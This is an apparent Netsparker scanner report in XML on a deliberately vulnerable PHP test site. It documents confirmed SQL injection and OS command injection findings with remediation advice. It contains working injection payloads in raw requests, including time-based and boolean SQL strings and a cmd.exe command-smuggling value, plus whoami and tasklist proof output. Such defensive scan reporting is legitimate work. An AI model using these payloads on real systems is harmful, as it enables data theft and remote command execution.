<?xml version="1.0" encoding="utf-8" ?>
<?xml-stylesheet href="vulnerabilities-list.xsl" type="text/xsl" ?>

<netsparker generated="2018-07-01 10:56:56 AM">
	<target>
		<url>http://php.testsparker.com/</url>
		<scantime>721</scantime>
	</target>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/artist.php?id=test%20%2b%20((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2f*%27XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)))OR%27%7c%22XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)))OR%22*%2f</url>
					<type>ConfirmedBlindSqlInjection</type>
					<severity>Critical</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a blind SQL injection, which occurs when data input by a user is interpreted as an SQL command rather than as normal data by the backend database.&lt;/p&gt;
&lt;p&gt;This is an extremely common vulnerability and its successful exploitation can have critical implications.&lt;/p&gt;
&lt;p&gt;Netsparker &lt;strong&gt;confirmed&lt;/strong&gt; the vulnerability by executing a test SQL query on the backend database. In these tests, SQL injection was not obvious, but the different responses from the page based on the injection test allowed us to identify and confirm the SQL injection.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;Depending on the backend database, the database connection settings, and the operating system, an attacker can mount one or more of the following attacks successfully:
&lt;ul&gt;
&lt;li&gt;Reading, updating and deleting arbitrary data or tables from the database&lt;/li&gt;
&lt;li&gt;Executing commands on the underlying operating system&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[ &lt;div&gt;
&lt;ol&gt;
&lt;li&gt;See the remedy for solution.&lt;/li&gt;
&lt;li&gt;If you are not using a database access layer (DAL), consider using one. This will help you centralize the issue. You can also use ORM (&lt;em&gt;object relational mapping&lt;/em&gt;). Most of the ORM systems use only parameterized queries and this can solve the whole SQL injection problem.&lt;/li&gt;
&lt;li&gt;Locate the all dynamically generated SQL queries and convert them to parameterized queries. &lt;em&gt;(If you decide to use a DAL/ORM, change all legacy code to use these new libraries.)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Use your weblogs and application logs to see if there were any previous but undetected attacks to this resource.&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt; ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;A robust method for mitigating the threat of SQL injection-based vulnerabilities is to use parameterized queries (&lt;em&gt;prepared statements&lt;/em&gt;). Almost all modern languages provide built-in libraries for this. Wherever possible, do not create dynamic SQL queries or SQL queries with string concatenation.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[ &lt;div&gt;There are numerous freely available tools to exploit SQL injection vulnerabilities. This is a complex area with many dependencies; however, it should be noted that the numerous resources available in this area have raised both attacker awareness of the issues and their ability to discover and leverage them. SQL injection is one of the most common web application vulnerabilities.&lt;/div&gt; ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Blind_SQL_Injection&#39;&gt;Blind SQL Injection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#BlindSQLInjections&#39;&gt;SQL Injection Cheat Sheet[#Blind]&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/SQL_injection&#39;&gt;OWASP SQL injection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.netsparker.com/blog/web-security/sql-injection-vulnerability/&#39;&gt;SQL Injection Vulnerability&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet&#39;&gt;SQL injection Prevention Cheat Sheet&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;http://bobby-tables.com&#39;&gt;A guide to preventing SQL injection&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

						<vulnerableparametertype>GET</vulnerableparametertype>
						<vulnerableparameter>id</vulnerableparameter>
						<vulnerableparametervalue>test + ((SELECT 1 FROM (SELECT SLEEP(25))A))/*&amp;apos;XOR(((SELECT 1 FROM (SELECT SLEEP(25))A)))OR&amp;apos;|&amp;quot;XOR(((SELECT 1 FROM (SELECT SLEEP(25))A)))OR&amp;quot;*/</vulnerableparametervalue>
					<rawrequest>&lt;![CDATA[GET /artist.php?id=test%20%2b%20((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2f*%27XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)))OR%27%7c%22XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)))OR%22*%2f HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be
Referer: http://php.testsparker.com/process.php?file=Generics/index.nsp
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Content-Length: 2803
Content-Type: text/html
Date: Fri, 29 Jun 2018 03:11:37 GMT


&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta name=&quot;keywords&quot; content=&quot;&quot; /&gt;
&lt;meta name=&quot;description&quot; content=&quot;&quot; /&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;title&gt;Netsparker Test Web Site -  PHP&lt;/title&gt;
&lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;
&lt;/head&gt;&lt;link type=&quot;text/css&quot; href=&quot;Generics/style.css&quot; rel=&quot;stylesheet&quot;/&gt;
&lt;body&gt;
&lt;div id=&quot;wrapper&quot;&gt;

	&lt;div id=&quot;menu&quot;&gt;
		&lt;ul&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/index.nsp&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;hello.php?name=Visitor&quot;&gt;Hello&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;products.php?pro=url&quot;&gt;Products&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/about.nsp&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/contact.nsp&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;auth/&quot;&gt;Login&lt;/a&gt;&lt;/li&gt;
		&lt;/ul&gt;
	&lt;/div&gt;
	&lt;!-- end #menu --&gt;
	&lt;div id=&quot;header&quot;&gt;

	&lt;/div&gt;
	&lt;!-- end #header --&gt;	&lt;div id=&quot;page&quot;&gt;
	&lt;div id=&quot;page-bgtop&quot;&gt;
	&lt;div id=&quot;page-bgbtm&quot;&gt;
		&lt;div id=&quot;content&quot;&gt;
			&lt;div class=&quot;post&quot;&gt;
				&lt;h2 class=&quot;title&quot;&gt;&lt;a href=&quot;artist.php#&quot;&gt;Artist Service&lt;/a&gt;&lt;/h2&gt;

				&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
				&lt;div class=&quot;entry&quot;&gt;
					&lt;p&gt;



no rows returned
                    &lt;/p&gt;

				&lt;/div&gt;
			&lt;/div&gt;
		&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
		&lt;/div&gt;
		&lt;!-- end #content --&gt;

	&lt;div id=&quot;sidebar&quot;&gt;
			&lt;ul&gt;
				&lt;li&gt;
					&lt;div id=&quot;search&quot; &gt;
						&lt;form method=&quot;get&quot; action=&quot;artist.php&quot;&gt;
							&lt;div&gt;
								&lt;input type=&quot;text&quot; name=&quot;s&quot; id=&quot;search-text&quot; value=&quot;&quot; /&gt;
								&lt;input type=&quot;submit&quot; id=&quot;search-submit&quot; value=&quot;GO&quot; /&gt;
							&lt;/div&gt;
						&lt;/form&gt;

					&lt;/div&gt;
					&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
				&lt;/li&gt;

â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs></proofs>


						<classification>
							<OWASP2013>A1</OWASP2013>
							<WASC>19</WASC>
							<CWE>89</CWE>
							<CAPEC>66</CAPEC>
							<PCI31>6.5.1</PCI31>
							<PCI32>6.5.1</PCI32>
							<HIPAA>164.306(a), 164.308(a)</HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N</vector>

									<score>
										<type>Base</type>
										<value>8.6</value>
										<severity>High</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>8.6</value>
										<severity>High</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>8.6</value>
										<severity>High</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/artist.php?id=1%20OR%2017-7%3d10</url>
					<type>ConfirmedBooleanSqlInjection</type>
					<severity>Critical</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a Boolean-based SQL injection, which occurs when data input by a user is interpreted as a SQL command rather than as normal data by the backend database.&lt;/p&gt;&lt;p&gt;This is an extremely common vulnerability and its successful exploitation can have critical implications.&lt;/p&gt;&lt;p&gt;Netsparker &lt;strong&gt;confirmed&lt;/strong&gt; the vulnerability by executing a test SQL query on the backend database. In these tests, SQL injection was not obvious, but the different responses from the page based on the injection test allowed Netsparker to identify and confirm the SQL injection.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;Depending on the backend database, the database connection settings and the operating system, an attacker can mount one or more of the following type of attacks successfully:&lt;ul&gt;&lt;li&gt;Reading, updating and deleting arbitrary data/tables from the database&lt;/li&gt;&lt;li&gt;Executing commands on the underlying operating system&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[ &lt;div&gt;&lt;ol&gt;&lt;li&gt;See the remedy for solution.&lt;/li&gt;&lt;li&gt;If you are not using a database access layer (DAL), consider using one. This will help you centralize the issue. You can also use ORM (&lt;em&gt;object relational mapping&lt;/em&gt;). Most of the ORM systems use only parameterized queries and this can solve the whole SQL injection problem.&lt;/li&gt;&lt;li&gt;Locate all of the dynamically generated SQL queries and convert them to parameterized queries. (&lt;em&gt;If you decide to use a DAL/ORM, change all legacy code to use these new libraries.&lt;/em&gt;)&lt;/li&gt;&lt;li&gt;Use your weblogs and application logs to see if there were any previous but undetected attacks to this resource.&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt; ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;The best way to protect your code against SQL injections is using parameterized queries (&lt;em&gt;prepared statements&lt;/em&gt;). Almost all modern languages provide built-in libraries for this. Wherever possible, do not create dynamic SQL queries or SQL queries with string concatenation.&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[ &lt;div&gt;There are numerous freely available tools to exploit SQL injection vulnerabilities. This is a complex area with many dependencies; however, it should be noted that the numerous resources available in this area have raised both attacker awareness of the issues and their ability to discover and leverage them.&lt;/div&gt; ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/SQL_injection&#39;&gt;OWASP SQL injection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/&#39;&gt;SQL Injection Cheat Sheet&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.netsparker.com/blog/web-security/sql-injection-vulnerability/&#39;&gt;SQL Injection Vulnerability&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet&#39;&gt;SQL injection Prevention Cheat Sheet&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;http://bobby-tables.com&#39;&gt;A guide to preventing SQL injection&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

						<vulnerableparametertype>GET</vulnerableparametertype>
						<vulnerableparameter>id</vulnerableparameter>
						<vulnerableparametervalue>1 OR 17-7=10</vulnerableparametervalue>
					<rawrequest>&lt;![CDATA[GET /artist.php?id=1%20OR%2017-7%3d10 HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be
Referer: http://php.testsparker.com/process.php?file=Generics/index.nsp
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[HTTP/1.1 200 OK
Server: Apache/2.2.8 (Win32) PHP/5.2.6
X-Powered-By: PHP/5.2.6
Content-Type: text/html
Transfer-Encoding: chunked
Date: Fri, 29 Jun 2018 03:11:30 GMT


&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta name=&quot;keywords&quot; content=&quot;&quot; /&gt;
&lt;meta name=&quot;description&quot; content=&quot;&quot; /&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;title&gt;Netsparker Test Web Site -  PHP&lt;/title&gt;
&lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;
&lt;/head&gt;&lt;link type=&quot;text/css&quot; href=&quot;Generics/style.css&quot; rel=&quot;stylesheet&quot;/&gt;
&lt;body&gt;
&lt;div id=&quot;wrapper&quot;&gt;

	&lt;div id=&quot;menu&quot;&gt;
		&lt;ul&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/index.nsp&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;hello.php?name=Visitor&quot;&gt;Hello&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;products.php?pro=url&quot;&gt;Products&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/about.nsp&quot;&gt;About&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;process.php?file=Generics/contact.nsp&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt;
			&lt;li&gt;&lt;a href=&quot;auth/&quot;&gt;Login&lt;/a&gt;&lt;/li&gt;
		&lt;/ul&gt;
	&lt;/div&gt;
	&lt;!-- end #menu --&gt;
	&lt;div id=&quot;header&quot;&gt;

	&lt;/div&gt;
	&lt;!-- end #header --&gt;	&lt;div id=&quot;page&quot;&gt;
	&lt;div id=&quot;page-bgtop&quot;&gt;
	&lt;div id=&quot;page-bgbtm&quot;&gt;
		&lt;div id=&quot;content&quot;&gt;
			&lt;div class=&quot;post&quot;&gt;
				&lt;h2 class=&quot;title&quot;&gt;&lt;a href=&quot;artist.php#&quot;&gt;Artist Service&lt;/a&gt;&lt;/h2&gt;

				&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
				&lt;div class=&quot;entry&quot;&gt;
					&lt;p&gt;



&lt;table class=&quot;container&quot;&gt;&lt;thead&gt;&lt;th&gt;ID&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;SURNAME&lt;/th&gt;&lt;th&gt;CREATION DATE &lt;/th&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr class=&quot;odd&quot;&gt;
&lt;td&gt;2 &lt;/td&gt;
&lt;td&gt;NICK &lt;/td&gt;
&lt;td&gt;WAHLBERG &lt;/td&gt;
&lt;td&gt;2006-02-15 04:34:33 &lt;/td&gt;
&lt;td&gt; &lt;/td&gt;
&lt;/tr&gt;
&lt;tr class=&quot;even&quot;&gt;
&lt;td&gt;3 &lt;/td&gt;
&lt;td&gt;ED &lt;/td&gt;
&lt;td&gt;CHASE &lt;/td&gt;
&lt;td&gt;2006-02-15 04:34:33 &lt;/td&gt;
&lt;td&gt; &lt;/td&gt;
&lt;/tr&gt;
&lt;tr class=&quot;odd&quot;&gt;
&lt;td&gt;4 &lt;/td&gt;
&lt;td&gt;JENNIFER &lt;/td&gt;
&lt;td&gt;DAVIS &lt;/td&gt;
&lt;td&gt;2006-02-15 04:34:33 &lt;/td&gt;
&lt;td&gt; &lt;/td&gt;
&lt;/tr&gt;
&lt;tr class=&quot;even&quot;&gt;
&lt;td&gt;5 &lt;/td&gt;
&lt;td&gt;JOHNNY &lt;/td&gt;
&lt;td&gt;LOLLOBRIGIDA &lt;/td&gt;
&lt;td
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs><proof>
<key><![CDATA[Identified Database Version]]></key>
<value><![CDATA[5 0.51b-community-nt-log]]></value>
</proof>
<proof>
<key><![CDATA[Identified Database User]]></key>
<value><![CDATA[root@localhost]]></value>
</proof>
<proof>
<key><![CDATA[Identified Database Name]]></key>
<value><![CDATA[sqlibench]]></value>
</proof>
</proofs>


						<classification>
							<OWASP2013>A1</OWASP2013>
							<WASC>19</WASC>
							<CWE>89</CWE>
							<CAPEC>66</CAPEC>
							<PCI31>6.5.1</PCI31>
							<PCI32>6.5.1</PCI32>
							<HIPAA>164.306(a), 164.308(a)</HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</vector>

									<score>
										<type>Base</type>
										<value>10.0</value>
										<severity>Critical</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>10.0</value>
										<severity>Critical</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>10.0</value>
										<severity>Critical</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/nslookup.php</url>
					<type>CommandInjection</type>
					<severity>Critical</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a command injection, which occurs when input data is interpreted as an operating system command.&lt;/p&gt;&lt;p&gt;This is a highly critical issue and should be addressed as soon as possible.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;An attacker can execute arbitrary commands on the system.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[ &lt;div&gt;&lt;ol&gt;&lt;li&gt;See the remedy for solution.&lt;/li&gt;&lt;li&gt;If possible, do not invoke system commands from the application.&lt;/li&gt;&lt;li&gt;Find all instances of similar code and make the code changes outlined in the remedy section.&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt; ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;Before invoking system commands within an application, consider using an API which allows you to separate commands and parameters. This can avoid many of the problems associated with command execution. See the external references for some examples. If this is not possible, whitelist all input and encode it in accordance with the underlying subsystem. (&lt;em&gt;e.g. if it is Windows, then you need to escape from cmd.exe control characters&lt;/em&gt;)&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[ &lt;div&gt;This is an easy issue to exploit, requiring little skill or knowledge. Most knowledgeable attackers can gain remote access over such a system within minutes.&lt;/div&gt; ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.netsparker.com/blog/web-security/command-injection-vulnerability/&#39;&gt;Command Injection Vulnerability&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Command_Injection&#39;&gt;OWASP - Command Injection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;http://projects.webappsec.org/w/page/13246950/OS%20Commanding&#39;&gt;WASC - OS Commanding&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
					<remedyReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://msdn.microsoft.com/en-us/library/system.diagnostics.process%28VS.71%29.aspx&#39;&gt;Process class in .NET&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;http://www.php.net/manual/en/ref.exec.php&#39;&gt;Program execution Functions in PHP&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></remedyReferences>
					<proofOfConcept><![CDATA[  ]]></proofOfConcept>

						<vulnerableparametertype>POST</vulnerableparametertype>
						<vulnerableparameter>param</vulnerableparameter>
						<vulnerableparametervalue>&amp;apos;&amp;amp; SET /A 0xFFF9999-2 &amp;amp;</vulnerableparametervalue>
					<rawrequest>&lt;![CDATA[POST /nslookup.php HTTP/1.1
Host: php.testsparker.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 37
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=cc357e5fc0d8f52676e059eed885e5be
Referer: http://php.testsparker.com/nslookup.php
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
X-Scanner: Netsparker

param=%27%26+SET+%2fA+0xFFF9999-2+%26]]&gt;</rawrequest>
					<rawresponse>

				        &lt;![CDATA[
â€¦&lt;/br&gt;=&quot;width: 89px&quot;&gt;&lt;/td&gt;
                &lt;td class=&quot;style1&quot; colspan=&quot;2&quot;&gt;
                &lt;/td&gt;
            &lt;/tr&gt;
        &lt;/table&gt;
                    &lt;/form&gt;
  &lt;pre&gt;Server:  UnKnown
Address:  172.30.0.2

&lt;span class=&quot;highlight&quot;&gt;268409239&lt;/span&gt;&lt;/pre&gt;					&lt;/p&gt;
				&lt;/div&gt;
			&lt;/div&gt;
		&lt;div style=&quot;clear: both;&quot;&gt;&amp;nbsp;&lt;/div&gt;
		&lt;/div&gt;
		&lt;!-- end #content --&gt;

	&lt;div id=&quot;sidebar&quot;&gt;
			&lt;ul&gt;
				&lt;li&gt;
					&lt;div id=&quot;search&quot; &gt;
						&lt;form metho
â€¦&lt;/br&gt;]]&gt;
				    </rawresponse>
					<extrainformation>
					</extrainformation>

						<proofs><proof>
<key><![CDATA[whoami]]></key>
<value><![CDATA[ip-ac1e00fc\apacheuser]]></value>
</proof>
<proof>
<key><![CDATA[ver]]></key>
<value><![CDATA[Microsoft Windows [Version 6.1.7601]]]></value>
</proof>
<proof>
<key><![CDATA[tasklist]]></key>
<value><![CDATA[Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0                            0         24 K
System                           4                            0        300 K
smss.exe                       272                            0      1,100 K
csrss.exe                      348                            0      5,232 K
wininit.exe                    400                            0      4,416 K
csrss.exe                      408                            1      3,820 K
winlogon.exe                   440                            1      4,216 K
services.exe                   496                            0      8,916 K
lsass.exe                      504                            0     11,780 K
lsm.exe                        512                            0      5,496 K
svchost.exe                    608                            0      8,944 K
nvvsvc.exe                     676                            0      6,632 K
nvwmi64.exe                    700                            0      3,964 K
nvSCPAPISvr.exe                724                            0      5,632 K
svchost.exe                    768                            0      7,360 K
LogonUI.exe                    848                            1     14,216 K
svchost.exe                    856                            0     12,320 K
svchost.exe                    904                            0     36,732 K
svchost.exe                    960                            0     13,456 K
svchost.exe                   1000                            0      5,620 K
svchost.exe                    288                            0     17,688 K
svchost.exe                    312                            0     12,128 K
spoolsv.exe                   1140                            0     10,856 K
nvxdsync.exe                  1156                            1     12,492 K
nvwmi64.exe                   1176                            1      8,040 K
svchost.exe                   1348                            0      9,088 K
inetinfo.exe                  1372                            0     13,024 K
sqlservr.exe                  1444                            0     14,748 K
mysqld-nt.exe                 1520                            0     10,200 K
svchost.exe                   1872                            0      2,760 K
sqlbrowser.exe                1908                            0      4,208 K
sqlwriter.exe                 1936                            0      6,088 K
XenGuestAgent.exe             2028                            0     38,672 K
Ec2Config.exe                 2076                            0     42,032 K
WmiPrvSE.exe                  2156                            0      7,476 K
svchost.exe                   2508                            0      6,400 K
svchost.exe                   2576                            0      5,544 K
WmiPrvSE.exe                  2616                            0     19,728 K
VSSVC.exe                     2732                            0      6,520 K
XenDpriv.exe                  2872                            0     19,532 K
msdtc.exe                     2696                            0      7,464 K
GoogleCrashHandler.exe        2320                            0      1,036 K
GoogleCrashHandler64.exe       688                            0        864 K
httpd.exe                     4012                            0     16,744 K
httpd.exe                     2584                            0     30,460 K
cmd.exe                       2968                            0      3,364 K
conhost.exe                   3276                            0      2,684 K
PING.EXE                      1712                            0      3,484 K
cmd.exe                       2140                            0      3,412 K
conhost.exe                   1040                            0      2,688 K
tasklist.exe                  3940                            0      5,332 K
cmd.exe                       3608                            0      2,720 K
conhost.exe                   1800                            0      2,676 K]]></value>
</proof>
</proofs>


						<classification>
							<OWASP2013>A1</OWASP2013>
							<WASC>31</WASC>
							<CWE>78</CWE>
							<CAPEC>88</CAPEC>
							<PCI31>6.5.1</PCI31>
							<PCI32>6.5.1</PCI32>
							<HIPAA>164.306(a), 164.308(a)</HIPAA>
							<OWASPPC></OWASPPC>

								<CVSS>
									<vector>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</vector>

									<score>
										<type>Base</type>
										<value>10.0</value>
										<severity>Critical</severity>
									</score>
									<score>
										<type>Temporal</type>
										<value>10.0</value>
										<severity>Critical</severity>
									</score>
									<score>
										<type>Environmental</type>
										<value>10.0</value>
										<severity>Critical</severity>
									</score>

								</CVSS>
						</classification>

				</vulnerability>
				<vulnerability confirmed="True">
					<url>http://php.testsparker.com/nslookup.php</url>
					<type>BlindCommandInjection</type>
					<severity>Critical</severity>
					<certainty>100</certainty>
					<description><![CDATA[ &lt;p&gt;Netsparker identified a blind command injection, which occurs when input data is interpreted as an operating system command.&lt;/p&gt;&lt;p&gt;It is a highly critical issue and should be addressed as soon as possible.&lt;/p&gt;&lt;p&gt;In this case, command injection was not obvious, but the different response times from the page based on the injection test allowed Netsparker to identify and confirm the command injection.&lt;/p&gt; ]]></description>
					<impact><![CDATA[ &lt;div&gt;An attacker can execute arbitrary commands on the system.&lt;/div&gt; ]]></impact>
					<actionsToTake><![CDATA[ &lt;div&gt;&lt;ol&gt;&lt;li&gt;See the remedy for solution.&lt;/li&gt;&lt;li&gt;If possible, do not invoke system commands from the application.&lt;/li&gt;&lt;li&gt;Find all instances of similar code and make the code changes outlined in the remedy section.&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt; ]]></actionsToTake>
					<remedy><![CDATA[ &lt;div&gt;Before invoking system commands within an application, consider using an API, which allows you to separate commands and parameters. This can avoid many of the problems associated with command execution. See the external references for some examples. If this is not possible, whitelist all input and encode it in accordance with the underlying subsystem. (&lt;em&gt;e.g. if it is Windows, then you need to escape from cmd.exe control characters&lt;/em&gt;)&lt;/div&gt; ]]></remedy>
					<requiredSkillsForExploitation><![CDATA[ &lt;div&gt;This is an easy issue to exploit, requiring little skill or knowledge. Most knowledgeable attackers can gain remote access over such a system within minutes.&lt;/div&gt; ]]></requiredSkillsForExploitation>
					<externalReferences><![CDATA[ &lt;div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&#39;https://www.netsparker.com/blog/web-security/command-injection-vulnerability/&#39;&gt;Command Injection Vulnerability&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;https://www.owasp.org/index.php/Command_Injection&#39;&gt;OWASP - Command Injection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&#39;http://projects.webappsec.org/w/page/13246950/OS%20Commanding&#39;&gt;WASC - OS Commanding&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt; ]]></externalReferences>
